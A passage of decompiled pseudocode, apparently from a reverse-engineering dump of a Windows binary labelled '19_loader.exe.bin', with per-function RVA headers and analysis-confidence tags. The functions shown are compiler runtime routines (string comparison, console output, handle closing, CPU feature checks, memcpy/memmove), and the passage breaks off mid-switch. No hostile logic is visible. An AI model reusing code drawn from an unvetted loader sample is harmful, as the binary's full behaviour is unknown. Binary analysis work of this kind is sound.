    local_70.LeadByte[6] = '\0';
    local_70.LeadByte[7] = '\0';
    local_70.LeadByte[8] = '\0';
    local_70.LeadByte[9] = '\0';
    if (param_5 == param_7) {
LAB_140021a58:
      puVar17 = auStackY_d8;
      goto LAB_140021a3b;
    }
    if (param_7 < 2) {
      if (param_5 < 2) {
        BVar6 = GetCPInfo(param_8,&local_70);
        puVar17 = auStackY_d8;
        if (BVar6 == 0) goto LAB_140021a3b;
        if (param_5 < 1) {
          if (param_7 < 1) goto LAB_14002182c;
          if (1 < local_70.MaxCharSize) {
            pBVar10 = local_70.LeadByte;
            bVar2 = local_70.LeadByte[0];
            while ((bVar2 != 0 && (pBVar10[1] != 0))) {
              if ((*pBVar10 <= *param_6) && (*param_6 <= pBVar10[1])) goto LAB_140021a58;
              pBVar10 = pBVar10 + 2;
              bVar2 = *pBVar10;
            }
          }
          goto LAB_140021822;
        }
        if (1 < local_70.MaxCharSize) {
          pBVar10 = local_70.LeadByte;
          bVar2 = local_70.LeadByte[0];
          while ((bVar2 != 0 && (pBVar10[1] != 0))) {
            if ((*pBVar10 <= *param_4) && (*param_4 <= pBVar10[1])) goto LAB_140021a58;
            pBVar10 = pBVar10 + 2;
            bVar2 = *pBVar10;
          }
        }
      }
      puVar17 = auStackY_d8;
    }
    else {
LAB_140021822:
      puVar17 = auStackY_d8;
    }
    goto LAB_140021a3b;
  }
LAB_14002182c:
  uVar7 = FUN_140019c24(param_8,9,(LPCSTR)param_4,param_5,(LPWSTR)0x0,0);
  puVar17 = auStackY_d8;
  if ((uVar7 == 0) ||
     (uVar13 = (longlong)(int)uVar7 * 2 + 0x10,
     uVar13 = -(ulonglong)((ulonglong)((longlong)(int)uVar7 * 2) < uVar13) & uVar13,
     puVar17 = auStackY_d8, uVar13 == 0)) goto LAB_140021a3b;
  if (uVar13 < 0x401) {
    lVar11 = FUN_140013c00();
    lVar11 = -lVar11;
    puVar17 = auStackY_d8 + lVar11;
    puVar15 = auStackY_d8 + lVar11;
    puVar12 = (undefined4 *)((longlong)local_88 + lVar11);
    if (puVar12 == (undefined4 *)0x0) goto LAB_140021a3b;
    *puVar12 = 0xcccc;
LAB_1400218c4:
    pWVar14 = (PCNZWCH)(puVar12 + 4);
    puVar17 = puVar15;
  }
  else {
    puVar12 = FUN_140019a00(uVar13);
    puVar17 = auStackY_d8;
    puVar15 = auStackY_d8;
    pWVar14 = (PCNZWCH)0x0;
    if (puVar12 != (undefined4 *)0x0) {
      *puVar12 = 0xdddd;
      goto LAB_1400218c4;
    }
  }
  if (pWVar14 == (PCNZWCH)0x0) goto LAB_140021a3b;
  *(uint *)(puVar17 + 0x28) = uVar7;
  *(PCNZWCH *)(puVar17 + 0x20) = pWVar14;
  *(undefined8 *)(puVar17 + -8) = 0x1400218ee;
  iVar8 = FUN_140019c24(param_8,1,(LPCSTR)param_4,param_5,*(LPWSTR *)(puVar17 + 0x20),
                        *(int *)(puVar17 + 0x28));
  if (iVar8 == 0) {
LAB_140021a28:
    iVar8 = *(int *)(pWVar14 + -8);
  }
  else {
    *(undefined4 *)(puVar17 + 0x28) = 0;
    *(undefined8 *)(puVar17 + 0x20) = 0;
    *(undefined8 *)(puVar17 + -8) = 0x140021914;
    iVar8 = FUN_140019c24(param_8,9,(LPCSTR)param_6,param_7,*(LPWSTR *)(puVar17 + 0x20),
                          *(int *)(puVar17 + 0x28));
    if ((iVar8 == 0) ||
       (uVar13 = (longlong)iVar8 * 2 + 0x10,
       uVar13 = -(ulonglong)((ulonglong)((longlong)iVar8 * 2) < uVar13) & uVar13, uVar13 == 0))
    goto LAB_140021a28;
    if (uVar13 < 0x401) {
      *(undefined8 *)(puVar17 + -8) = 0x14002195d;
      lVar11 = FUN_140013c00();
      lVar11 = -lVar11;
      puVar16 = puVar17 + lVar11;
      puVar12 = (undefined4 *)(puVar17 + lVar11 + 0x50);
      puVar17 = puVar17 + lVar11;
      if (puVar12 == (undefined4 *)0x0) goto LAB_140021a28;
      *puVar12 = 0xcccc;
      puVar17 = puVar16;
LAB_140021989:
      puVar18 = puVar12 + 4;
    }
    else {
      *(undefined8 *)(puVar17 + -8) = 0x14002197b;
      puVar12 = FUN_140019a00(uVar13);
      puVar18 = (undefined4 *)0x0;
      if (puVar12 != (undefined4 *)0x0) {
        *puVar12 = 0xdddd;
        goto LAB_140021989;
      }
    }
    pbVar4 = local_80;
    if (puVar18 == (undefined4 *)0x0) goto LAB_140021a28;
    piVar1 = puVar18 + -4;
    *(int *)(puVar17 + 0x28) = iVar8;
    *(undefined4 **)(puVar17 + 0x20) = puVar18;
    *(undefined8 *)(puVar17 + -8) = 0x1400219b8;
    iVar9 = FUN_140019c24(param_8,1,(LPCSTR)pbVar4,param_7,*(LPWSTR *)(puVar17 + 0x20),
                          *(int *)(puVar17 + 0x28));
    uVar3 = local_88[0];
    if (iVar9 != 0) {
      *(undefined8 *)(puVar17 + 0x40) = 0;
      *(undefined8 *)(puVar17 + 0x38) = 0;
      *(undefined8 *)(puVar17 + 0x30) = 0;
      puVar5 = local_78;
      *(int *)(puVar17 + 0x28) = iVar8;
      *(undefined4 **)(puVar17 + 0x20) = puVar18;
      *(undefined8 *)(puVar17 + -8) = 0x140021a03;
      FUN_140016558(puVar5,uVar3,pWVar14,uVar7,*(PCNZWCH *)(puVar17 + 0x20),*(int *)(puVar17 + 0x28)
                    ,*(undefined8 *)(puVar17 + 0x30),*(undefined8 *)(puVar17 + 0x38),
                    *(undefined8 *)(puVar17 + 0x40));
      if (*piVar1 == 0xdddd) {
        *(undefined8 *)(puVar17 + -8) = 0x140021a17;
        FUN_140017fb0(piVar1);
      }
      if (*(int *)(pWVar14 + -8) == 0xdddd) {
        *(undefined8 *)(puVar17 + -8) = 0x140021a24;
        FUN_140017fb0(pWVar14 + -8);
      }
      goto LAB_140021a3b;
    }
    if (*piVar1 == 0xdddd) {
      *(undefined8 *)(puVar17 + -8) = 0x1400219d0;
      FUN_140017fb0(piVar1);
    }
    iVar8 = *(int *)(pWVar14 + -8);
  }
  if (iVar8 == 0xdddd) {
    *(undefined8 *)(puVar17 + -8) = 0x140021a39;
    FUN_140017fb0(pWVar14 + -8);
  }
LAB_140021a3b:
  uVar13 = local_58 ^ (ulonglong)local_88;
  *(undefined8 *)(puVar17 + -8) = 0x140021a47;
  FUN_14001a2d0(uVar13);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21a60 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021a60 rva=0x21a60 */

undefined8 FUN_140021a60(undefined8 *param_1,longlong param_2)

{
  *param_1 = 0;
  *(undefined1 *)(param_2 + 0x30) = 1;
  *(undefined4 *)(param_2 + 0x2c) = 0x2a;
  return 0xffffffffffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21a74 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021a74 rva=0x21a74 */

undefined8 FUN_140021a74(undefined8 param_1,undefined8 *param_2)

{
  *param_2 = 0;
  return param_1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21a7c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021a7c rva=0x21a7c */

bool FUN_140021a7c(void)

{
  if (DAT_1400e0640 == (HANDLE)0xfffffffffffffffe) {
    DAT_1400e0640 = CreateFileW(L"CONOUT$",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  }
  return DAT_1400e0640 != (HANDLE)0xffffffffffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21ad0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021ad0 rva=0x21ad0 */

BOOL FUN_140021ad0(void *param_1,DWORD param_2,LPDWORD param_3)

{
  BOOL BVar1;
  DWORD DVar2;
  
  BVar1 = WriteConsoleW(DAT_1400e0640,param_1,param_2,param_3,(LPVOID)0x0);
  if (BVar1 == 0) {
    DVar2 = GetLastError();
    if (DVar2 == 6) {
      if (DAT_1400e0640 < (HANDLE)0xfffffffffffffffe) {
        CloseHandle(DAT_1400e0640);
      }
      DAT_1400e0640 =
           CreateFileW(L"CONOUT$",0x40000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
      BVar1 = WriteConsoleW(DAT_1400e0640,param_1,param_2,param_3,(LPVOID)0x0);
    }
  }
  return BVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21b90 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021b90 rva=0x21b90 */

void FUN_140021b90(void)

{
  if (DAT_1400e0640 < (HANDLE)0xfffffffffffffffe) {
    CloseHandle(DAT_1400e0640);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21bac | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021bac rva=0x21bac */

undefined8 FUN_140021bac(uint param_1,longlong param_2)

{
  BOOL BVar1;
  DWORD DVar2;
  longlong lVar3;
  longlong lVar4;
  HANDLE hObject;
  undefined8 uVar5;
  
  lVar3 = FUN_14001b720(param_1);
  if (lVar3 != -1) {
    if (((param_1 == 1) && ((*(byte *)(DAT_1400e0d40 + 200) & 1) != 0)) ||
       ((param_1 == 2 && ((*(byte *)(DAT_1400e0d40 + 0x80) & 1) != 0)))) {
      lVar3 = FUN_14001b720(2);
      lVar4 = FUN_14001b720(1);
      if (lVar4 == lVar3) goto LAB_140021bce;
    }
    hObject = (HANDLE)FUN_14001b720(param_1);
    BVar1 = CloseHandle(hObject);
    if (BVar1 == 0) {
      DVar2 = GetLastError();
      goto LAB_140021c2c;
    }
  }
LAB_140021bce:
  DVar2 = 0;
LAB_140021c2c:
  FUN_14001b798(param_1);
  *(undefined1 *)
   ((&DAT_1400e0d40)[(longlong)(int)param_1 >> 6] + 0x38 + (ulonglong)(param_1 & 0x3f) * 0x48) = 0;
  if (DVar2 == 0) {
    uVar5 = 0;
  }
  else {
    FUN_140018f2c(DVar2,param_2);
    uVar5 = 0xffffffff;
  }
  return uVar5;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21c7c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021c7c rva=0x21c7c */

ulonglong FUN_140021c7c(uint param_1,longlong *param_2)

{
  ulonglong uVar1;
  uint local_res8 [4];
  undefined1 local_res18 [8];
  uint local_res20 [2];
  uint local_28 [2];
  uint *local_20;
  longlong *local_18;
  
  if (param_1 == 0xfffffffe) {
    *(undefined1 *)(param_2 + 7) = 1;
    *(undefined4 *)((longlong)param_2 + 0x34) = 0;
    *(undefined1 *)(param_2 + 6) = 1;
    *(undefined4 *)((longlong)param_2 + 0x2c) = 9;
  }
  else {
    local_res8[0] = param_1;
    if (((-1 < (int)param_1) && (param_1 < DAT_1400e1140)) &&
       ((*(byte *)((&DAT_1400e0d40)[(longlong)(int)param_1 >> 6] + 0x38 +
                  (ulonglong)(param_1 & 0x3f) * 0x48) & 1) != 0)) {
      local_20 = local_res8;
      local_res20[0] = param_1;
      local_28[0] = param_1;
      local_18 = param_2;
      uVar1 = FUN_140021d40(local_res18,local_28,&local_20,local_res20);
      return uVar1;
    }
    *(undefined1 *)(param_2 + 7) = 1;
    *(undefined4 *)((longlong)param_2 + 0x34) = 0;
    *(undefined1 *)(param_2 + 6) = 1;
    *(undefined4 *)((longlong)param_2 + 0x2c) = 9;
    FUN_1400182a4(0,0,0,0,0,param_2);
  }
  return 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21d40 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021d40 rva=0x21d40 */

ulonglong FUN_140021d40(undefined8 param_1,uint *param_2,undefined8 *param_3,uint *param_4)

{
  uint uVar1;
  longlong lVar2;
  ulonglong uVar3;
  
  FUN_14001b9f4(*param_2);
  uVar1 = *(uint *)*param_3;
  lVar2 = param_3[1];
  if ((*(byte *)((&DAT_1400e0d40)[(longlong)(int)uVar1 >> 6] + 0x38 +
                (ulonglong)(uVar1 & 0x3f) * 0x48) & 1) == 0) {
    *(undefined1 *)(lVar2 + 0x30) = 1;
    *(undefined4 *)(lVar2 + 0x2c) = 9;
    uVar3 = 0xffffffff;
  }
  else {
    uVar3 = FUN_140021bac(uVar1,lVar2);
    uVar3 = uVar3 & 0xffffffff;
  }
  FUN_14001ba1c(*param_4);
  return uVar3;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21db8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021db8 rva=0x21db8 */

undefined4 FUN_140021db8(undefined8 *param_1)

{
  undefined4 uVar1;
  
  *(undefined4 *)(param_1 + 3) = 0xffffffff;
  *param_1 = 0;
  param_1[1] = 0;
  *(undefined4 *)(param_1 + 2) = 0;
  *(undefined8 *)((longlong)param_1 + 0x1c) = 0;
  param_1[5] = 0;
  LOCK();
  uVar1 = *(undefined4 *)((longlong)param_1 + 0x14);
  *(undefined4 *)((longlong)param_1 + 0x14) = 0;
  UNLOCK();
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21de0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021de0 rva=0x21de0 */

/* WARNING: Removing unreachable block (ram,0x000140021e60) */
/* WARNING: Removing unreachable block (ram,0x000140021e52) */
/* WARNING: Removing unreachable block (ram,0x000140021df7) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined8 FUN_140021de0(void)

{
  longlong lVar1;
  int *piVar2;
  undefined8 uVar3;
  byte in_XCR0;
  
  _DAT_1400e11e8 = 0;
  DAT_1400e11ec = 0;
  lVar1 = cpuid_Version_info(1);
  if ((*(uint *)(lVar1 + 0xc) & 0x18001000) == 0x18001000) {
    uVar3 = xinuse(0);
    if ((in_XCR0 & (byte)uVar3 & 6) == 6) {
      _DAT_1400e11e8 = 1;
      DAT_1400e11ec = 1;
    }
    else {
      _DAT_1400e11e8 = 0;
    }
  }
  if ((_DAT_1400e11e8 != 0) && (piVar2 = (int *)cpuid_basic_info(0), 6 < *piVar2)) {
    lVar1 = cpuid_Extended_Feature_Enumeration_info(7);
    if ((*(uint *)(lVar1 + 4) & 0x20) != 0) {
      DAT_1400e11ec = 3;
      _DAT_1400e11e8 = 3;
      return 0;
    }
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21eb0 | verified_conservative_local_CFG_only ===== */
/* NORMAL INITIALIZATION CONTEXT ONLY. Original-byte conservative local CFG with statically derived loader TLS. Local computed-JMP targets are finite; PE-bound import tails and CFG guard dispatch are represented as tail calls. Unknown callee/store effects remain havoc. Actual indirect CALL targets and transitive behavior require separate evidence. Not original source, not a buildable project. Original instruction bytes unchanged. */

/* WARNING: This is an inlined function */

void _guard_dispatch_icall(void)

{
  code *in_RAX;
  
  (*in_RAX)();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21ed0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021ed0 rva=0x21ed0 */

/* WARNING: This is an inlined function */
/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void _guard_dispatch_icall(void)

{
  code *in_RAX;
  
  (*in_RAX)();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21ef0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021ef0 rva=0x21ef0 */

/* WARNING: This is an inlined function */
/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void _guard_dispatch_icall(void)

{
  code *in_RAX;
  
  (*in_RAX)();
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21f20 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140021f20 rva=0x21f20 */

void FUN_140021f20(undefined1 *param_1,undefined1 *param_2,longlong param_3)

{
  for (; param_3 != 0; param_3 = param_3 + -1) {
    *param_1 = *param_2;
    param_2 = param_2 + 1;
    param_1 = param_1 + 1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x21f30 | partial_markers_remain ===== */
/* address=140021f30 rva=0x21f30 */

void FUN_140021f30(undefined8 *param_1,undefined8 *param_2,ulonglong param_3)

{
  undefined8 *puVar1;
  undefined8 *puVar2;
  undefined1 auVar3 [32];
  undefined1 auVar4 [32];
  undefined1 auVar5 [32];
  undefined1 auVar6 [32];
  undefined1 uVar7;
  undefined2 uVar8;
  undefined4 uVar9;
  undefined8 uVar10;
  undefined8 uVar11;
  undefined8 uVar12;
  undefined8 uVar13;
  undefined8 uVar14;
  undefined8 uVar15;
  undefined8 uVar16;
  undefined8 uVar17;
  undefined8 uVar18;
  undefined8 uVar19;
  undefined8 uVar20;
  undefined8 uVar21;
  undefined8 uVar22;
  undefined1 (*pauVar23) [32];
  undefined1 (*pauVar24) [32];
  undefined8 *puVar25;
  undefined1 (*pauVar26) [32];
  undefined1 (*pauVar27) [32];
  undefined8 *puVar28;
  ulonglong uVar29;
  longlong lVar30;
  ulonglong uVar31;
  undefined8 uVar32;
  undefined8 uVar33;
  
  switch(param_3) {
  case 0:
    return;
  case 1:
    *(undefined1 *)param_1 = *(undefined1 *)param_2;
    return;
  case 2:
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    return;
  case 3:
    uVar7 = *(undefined1 *)((longlong)param_2 + 2);
    *(undefined2 *)param_1 = *(undefined2 *)param_2;
    *(undefined1 *)((longlong)param_1 + 2) = uVar7;
    return;
  case 4:
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    return;
  case 5:
    uVar7 = *(undefined1 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined1 *)((longlong)param_1 + 4) = uVar7;
    return;
  case 6:
    uVar8 = *(undefined2 *)((longlong)param_2 + 4);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar8;
    return;
  case 7:
    uVar8 = *(undefined2 *)((longlong)param_2 + 4);
    uVar7 = *(undefined1 *)((longlong)param_2 + 6);
    *(undefined4 *)param_1 = *(undefined4 *)param_2;
    *(undefined2 *)((longlong)param_1 + 4) = uVar8;
    *(undefined1 *)((longlong)param_1 + 6) = uVar7;
    return;
  case 8:
    *param_1 = *param_2;
    return;
  case 9:
    uVar7 = *(undefined1 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined1 *)(param_1 + 1) = uVar7;
    return;
  case 10:
    uVar8 = *(undefined2 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar8;
    return;
  case 0xb:
    uVar8 = *(undefined2 *)(param_2 + 1);
    uVar7 = *(undefined1 *)((longlong)param_2 + 10);
    *param_1 = *param_2;
    *(undefined2 *)(param_1 + 1) = uVar8;
    *(undefined1 *)((longlong)param_1 + 10) = uVar7;
    return;
  case 0xc:
    uVar9 = *(undefined4 *)(param_2 + 1);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    return;
  case 0xd:
    uVar9 = *(undefined4 *)(param_2 + 1);
    uVar7 = *(undefined1 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    *(undefined1 *)((longlong)param_1 + 0xc) = uVar7;
    return;
  case 0xe:
    uVar9 = *(undefined4 *)(param_2 + 1);
    uVar8 = *(undefined2 *)((longlong)param_2 + 0xc);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar8;
    return;
  case 0xf:
    uVar9 = *(undefined4 *)(param_2 + 1);
    uVar8 = *(undefined2 *)((longlong)param_2 + 0xc);
    uVar7 = *(undefined1 *)((longlong)param_2 + 0xe);
    *param_1 = *param_2;
    *(undefined4 *)(param_1 + 1) = uVar9;
    *(undefined2 *)((longlong)param_1 + 0xc) = uVar8;
    *(undefined1 *)((longlong)param_1 + 0xe) = uVar7;
    return;
  }
  if (param_3 < 0x21) {
    uVar10 = param_2[1];
    puVar25 = (undefined8 *)((longlong)param_2 + (param_3 - 0x10));
    uVar11 = *puVar25;
    uVar12 = puVar25[1];
    *param_1 = *param_2;
    param_1[1] = uVar10;
    puVar25 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    *puVar25 = uVar11;
    puVar25[1] = uVar12;
    return;
  }
  puVar25 = (undefined8 *)((longlong)param_2 + param_3);
  if (param_1 <= param_2) {
    puVar25 = param_1;
  }
  if (param_1 < puVar25) {
    uVar10 = *param_2;
    uVar11 = param_2[1];
    lVar30 = (longlong)param_2 - (longlong)param_1;
    puVar25 = (undefined8 *)((longlong)param_1 + lVar30 + (param_3 - 0x10));
    uVar12 = *puVar25;
    uVar13 = puVar25[1];
    puVar28 = (undefined8 *)((longlong)param_1 + (param_3 - 0x10));
    uVar29 = param_3 - 0x10;
    puVar25 = puVar28;
    uVar32 = uVar12;
    uVar33 = uVar13;
    if (((ulonglong)puVar28 & 0xf) != 0) {
      puVar25 = (undefined8 *)((ulonglong)puVar28 & 0xfffffffffffffff0);
      uVar32 = *(undefined8 *)((longlong)puVar25 + lVar30);
      uVar33 = ((undefined8 *)((longlong)puVar25 + lVar30))[1];
      *puVar28 = uVar12;
      *(undefined8 *)((longlong)param_1 + (param_3 - 8)) = uVar13;
      uVar29 = (longlong)puVar25 - (longlong)param_1;
    }
    uVar31 = uVar29 >> 7;
    if (uVar31 != 0) {
      *puVar25 = uVar32;
      puVar25[1] = uVar33;
      puVar28 = puVar25;
      while( true ) {
        puVar1 = (undefined8 *)((longlong)puVar28 + lVar30 + -0x10);
        uVar12 = puVar1[1];
        puVar25 = (undefined8 *)((longlong)puVar28 + lVar30 + -0x20);
        uVar13 = *puVar25;
        uVar32 = puVar25[1];
        puVar25 = puVar28 + -0x10;
        puVar28[-2] = *puVar1;
        puVar28[-1] = uVar12;
        puVar28[-4] = uVar13;
        puVar28[-3] = uVar32;
        puVar1 = (undefined8 *)((longlong)puVar28 + lVar30 + -0x30);
        uVar12 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar28 + lVar30 + -0x40);
        uVar13 = *puVar2;
        uVar32 = puVar2[1];
        uVar31 = uVar31 - 1;
        puVar28[-6] = *puVar1;
        puVar28[-5] = uVar12;
        puVar28[-8] = uVar13;
        puVar28[-7] = uVar32;
        puVar1 = (undefined8 *)((longlong)puVar28 + lVar30 + -0x50);
        uVar12 = puVar1[1];
        puVar2 = (undefined8 *)((longlong)puVar28 + lVar30 + -0x60);
        uVar13 = *puVar2;
        uVar32 = puVar2[1];
        puVar28[-10] = *puVar1;
        puVar28[-9] = uVar12;
        puVar28[-0xc] = uVar13;
        puVar28[-0xb] = uVar32;
        puVar1 = (undefined8 *)((longlong)puVar28 + lVar30 + -0x70);
        uVar12 = *puVar1;
        uVar13 = puVar1[1];
        uVar32 = *(undefined8 *)((longlong)puVar25 + lVar30);
        uVar33 = ((undefined8 *)((longlong)puVar25 + lVar30))[1];
        if (uVar31 == 0) break;
        puVar28[-0xe] = uVar12;
        puVar28[-0xd] = uVar13;
        *puVar25 = uVar32;
        puVar28[-0xf] = uVar33;
        puVar28 = puVar25;
      }
      puVar28[-0xe] = uVar12;
      puVar28[-0xd] = uVar13;
      uVar29 = uVar29 & 0x7f;
    }
    for (uVar31 = uVar29 >> 4; uVar31 != 0; uVar31 = uVar31 - 1) {
      *puVar25 = uVar32;
      puVar25[1] = uVar33;
      puVar25 = puVar25 + -2;
      uVar32 = *(undefined8 *)((longlong)puVar25 + lVar30);
      uVar33 = ((undefined8 *)((longlong)puVar25 + lVar30))[1];
    }
    if ((uVar29 & 0xf) != 0) {
      *param_1 = uVar10;
      param_1[1] = uVar11;
    }
    *puVar25 = uVar32;
    puVar25[1] = uVar33;
    return;
  }
  if (DAT_1400dfc88 < 3) {
    if ((param_3 < 0x801) || (((byte)DAT_1400e0794 & 2) == 0)) {
      if (0x80 < param_3) {
        lVar30 = ((ulonglong)param_1 & 0xf) - 0x10;
        puVar25 = (undefined8 *)((longlong)param_1 - lVar30);
        puVar28 = (undefined8 *)((longlong)param_2 - lVar30);
        param_3 = param_3 + lVar30;
        if (0x80 < param_3) {
          do {
            uVar10 = puVar28[1];
            uVar11 = puVar28[2];
            uVar12 = puVar28[3];
            uVar13 = puVar28[4];
            uVar32 = puVar28[5];
            uVar33 = puVar28[6];
            uVar14 = puVar28[7];
            *puVar25 = *puVar28;
            puVar25[1] = uVar10;
            puVar25[2] = uVar11;
            puVar25[3] = uVar12;
            puVar25[4] = uVar13;
            puVar25[5] = uVar32;
            puVar25[6] = uVar33;
            puVar25[7] = uVar14;
            uVar10 = puVar28[9];
            uVar11 = puVar28[10];
            uVar12 = puVar28[0xb];
            uVar13 = puVar28[0xc];
            uVar32 = puVar28[0xd];
            uVar33 = puVar28[0xe];
            uVar14 = puVar28[0xf];
            puVar25[8] = puVar28[8];
            puVar25[9] = uVar10;
            puVar25[10] = uVar11;
            puVar25[0xb] = uVar12;
            puVar25[0xc] = uVar13;
            puVar25[0xd] = uVar32;
            puVar25[0xe] = uVar33;
            puVar25[0xf] = uVar14;
            puVar25 = puVar25 + 0x10;
            puVar28 = puVar28 + 0x10;
            param_3 = param_3 - 0x80;
          } while (0x7f < param_3);
        }
      }
                    /* WARNING: Could not recover jumptable at 0x000140022456. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      (*(code *)(IMAGE_DOS_HEADER_140000000.e_magic +
                *(uint *)(&DAT_1400903d8 + (param_3 + 0xf >> 4) * 4)))();
      return;
    }
FUN_140021f20:
    for (; param_3 != 0; param_3 = param_3 - 1) {
      *(undefined1 *)param_1 = *(undefined1 *)param_2;
      param_2 = (undefined8 *)((longlong)param_2 + 1);
      param_1 = (undefined8 *)((longlong)param_1 + 1);
    }
    return;
  }
  if ((0x2000 < param_3) && (param_3 < 0x180001)) {
    puVar25 = param_1 + 8;
    if (param_2 < param_1) {
      puVar25 = param_2;
    }
    if ((puVar25 <= param_2) && (((byte)DAT_1400e0794 & 2) != 0)) goto FUN_140021f20;
  }
  uVar10 = *param_2;
  uVar11 = param_2[1];
  uVar12 = param_2[2];
  uVar13 = param_2[3];
  puVar25 = (undefined8 *)((longlong)param_2 + (param_3 - 0x20));
  uVar32 = *puVar25;
  uVar33 = puVar25[1];
  uVar14 = puVar25[2];
  uVar15 = puVar25[3];
  if (0x100 < param_3) {
    lVar30 = ((ulonglong)param_1 & 0x1f) - 0x20;
    pauVar23 = (undefined1 (*) [32])((longlong)param_1 - lVar30);
    pauVar26 = (undefined1 (*) [32])((longlong)param_2 - lVar30);
    param_3 = param_3 + lVar30;
    if (0x100 < param_3) {
      if (0x180000 < param_3) {
        do {
          uVar29 = param_3;
          pauVar27 = pauVar26;
          pauVar24 = pauVar23;
          auVar3 = pauVar27[1];
          auVar4 = pauVar27[2];
          auVar5 = pauVar27[3];
          auVar6 = vmovntdq_avx(*pauVar27);
          *pauVar24 = auVar6;
          auVar3 = vmovntdq_avx(auVar3);
          pauVar24[1] = auVar3;
          auVar3 = vmovntdq_avx(auVar4);
          pauVar24[2] = auVar3;
          auVar3 = vmovntdq_avx(auVar5);
          pauVar24[3] = auVar3;
          auVar3 = pauVar27[5];
          auVar4 = pauVar27[6];
          auVar5 = pauVar27[7];
          auVar6 = vmovntdq_avx(pauVar27[4]);
          pauVar24[4] = auVar6;
          auVar3 = vmovntdq_avx(auVar3);
          pauVar24[5] = auVar3;
          auVar3 = vmovntdq_avx(auVar4);
          pauVar24[6] = auVar3;
          auVar3 = vmovntdq_avx(auVar5);
          pauVar24[7] = auVar3;
          pauVar23 = pauVar24 + 8;
          pauVar26 = pauVar27 + 8;
          param_3 = uVar29 - 0x100;
        } while (0xff < uVar29 - 0x100);
        uVar31 = uVar29 - 0xe1 & 0xffffffffffffffe0;
        switch(uVar29) {
        case 0x1e1:
        case 0x1e2:
        case 0x1e3:
        case 0x1e4:
        case 0x1e5:
        case 0x1e6:
        case 0x1e7:
        case 0x1e8:
        case 0x1e9:
        case 0x1ea:
        case 0x1eb:
        case 0x1ec:
        case 0x1ed:
        case 0x1ee:
        case 0x1ef:
        case 0x1f0:
        case 0x1f1:
        case 0x1f2:
        case 499:
        case 500:
        case 0x1f5:
        case 0x1f6:
        case 0x1f7:
        case 0x1f8:
        case 0x1f9:
        case 0x1fa:
        case 0x1fb:
        case 0x1fc:
        case 0x1fd:
        case 0x1fe:
        case 0x1ff:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(*pauVar27 + uVar31));
          *(undefined1 (*) [32])(*pauVar24 + uVar31) = auVar3;
        case 0x1c1:
        case 0x1c2:
        case 0x1c3:
        case 0x1c4:
        case 0x1c5:
        case 0x1c6:
        case 0x1c7:
        case 0x1c8:
        case 0x1c9:
        case 0x1ca:
        case 0x1cb:
        case 0x1cc:
        case 0x1cd:
        case 0x1ce:
        case 0x1cf:
        case 0x1d0:
        case 0x1d1:
        case 0x1d2:
        case 0x1d3:
        case 0x1d4:
        case 0x1d5:
        case 0x1d6:
        case 0x1d7:
        case 0x1d8:
        case 0x1d9:
        case 0x1da:
        case 0x1db:
        case 0x1dc:
        case 0x1dd:
        case 0x1de:
        case 0x1df:
        case 0x1e0:
          auVar3 = vmovntdq_avx(*(undefined1 (*) [32])(pauVar27[1] + uVar31));
          *(undefined1 (*) [32])(pauVar24[1] + uVar31) = auVar3;
        case 0x1a1:
        case 0x1a2:
        case 0x1a3:
        case 0x1a4:
        case 0x1a5:
        case 0x1a6:
        case 0x1a7:
        case 0x1a8:
        case 0x1a9:
        case 0x1aa:
        case 0x1ab:
        case 0x1ac:
        case 0x1ad:
        case 0x1ae:
        case 0x1af:
        case 0x1b0:
        case 0x1b1:
        case 0x1b2:
        case 0x1b3:
        case 0x1b4:
        case 0x1b5:
        case 0x1b6:
